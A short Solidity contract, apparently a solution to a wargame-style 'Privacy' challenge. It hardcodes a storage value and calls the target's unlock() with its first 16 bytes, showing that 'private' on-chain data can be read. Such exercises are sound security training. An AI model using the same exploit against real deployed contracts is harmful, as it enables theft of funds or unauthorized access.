// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "./privacy.sol";

contract AttackPrivacy {
    
    Privacy privacyContract;
    bytes32 field = 0x164992ab1f1a021179677f107a1c823e1f6e93bd198466300e26bcf3e33a41c6;

    constructor(address privacyContractAddress) {
        privacyContract = Privacy(privacyContractAddress);
    }

    function attack() public {
        privacyContract.unlock(bytes16(field));
    }
}

